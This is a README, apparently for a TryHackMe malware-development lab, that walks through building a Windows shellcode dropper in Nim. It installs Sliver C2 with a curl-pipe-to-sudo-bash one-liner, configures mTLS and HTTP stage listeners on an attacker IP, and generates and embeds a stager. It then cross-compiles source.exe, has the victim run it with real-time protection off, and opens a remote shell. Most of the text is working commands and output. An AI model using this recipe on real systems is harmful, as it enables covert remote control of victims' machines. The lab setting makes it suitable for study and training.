# THM_Kol_Exploit
## Follow bellow steps to reproduce

- **Dependencies**
 1. Make sure nim & winim is intalled on Kali / Linux. Nim : `sudo apt-get install nim`  
 2. clone [winim](https://github.com/khchen/winim) in local directory, use `'nimble install'` (git should be installed)
 3. Install [Sliver](https://github.com/BishopFox/sliver#linux-one-liner) C2 on kali using onle liner `curl https://sliver.sh/install|sudo bash` (⚠️might be a harmful way)
 4. For cross compilation MinGW-w64 toolchain need to be installed by `sudo apt install mingw-w64`. (development in windows doesn`t required this step)
 5. Use the command `nimble install` to install binnim.

- **Development**
  1. Fork & Clone [this](https://github.com/sayantanHack/thm_maldev) repo. Use source.nim file and edit accordingly.
  2. Use [binnim](https://github.com/JohnHammond/binnim/) to convert the shell code.(Binnim might not work for specific verion I`m adding proper verion.)
 
- **Gearing up ⚙️**
  1. To create the shell code & get the listener use [Sliver's stager](https://github.com/BishopFox/sliver/wiki/Stagers) module. Type `sliver` in terminal.
  2. Then create new profiles through this command
     ```sliver > profiles new --mtls <Attackers IP> --format shellcode win-shellcode  
        [*] Saved new profile win-shellcode
        sliver > profiles
        Name           Platform       Command & Control              Debug  Format      Obfuscation   Limitations
        ====           ========       =================              =====  ======      ===========   ===========
        win-shellcode  windows/amd64  [1] mtls://<Attackers IP>:8888  false  SHELLCODE   enabled
     ```
  3.  Now create a staging listener and link it to the profile:
      ```
      sliver > stage-listener --url http://<Attackers IP>:1234 --profile win-shellcode

      [*] No builds found for profile win-shellcode, generating a new one
      [*] Job 1 (tcp) started
      sliver > jobs

      ID  Name  Protocol  Port  
      ==  ====  ========  ====  
      1   http  tcp       1234  
      2   mtls  tcp       8888  
     ```
  4. Now to generate the payload using the beloww command: (port should be same as init time)
     ```
      sliver > generate stager --lhost <Attackers IP> --lport 1234 --protocol http --save /tmp
      [*] Sliver stager saved to: /tmp/FANCY_NAME
    ```
  5. Next use binnim to convert the payload `sudo ./binnim /tmp/FANCY_NAME -f nim`
  6. Add the shell code to source.nim file. 

- **Finishing up and Exploitation**

  1. Now [croscompile](https://nim-lang.org/docs/nimc.html#crossminuscompilation-for-windows) the malddev code to windows format `nim c -d:mingw source.nim`
  2. On the Sliver shell type `mtls` to start the listener.
  3. share this (source.exe) to Windows and click on it. (off course MS realtime protection should be off)
  4. Now we got some the on sliver session. Also check `sesions` to check.
  5. Now `use <session_id>` in sliver shell , and its done. Now we can type `shell` and execute windows command.
     
  
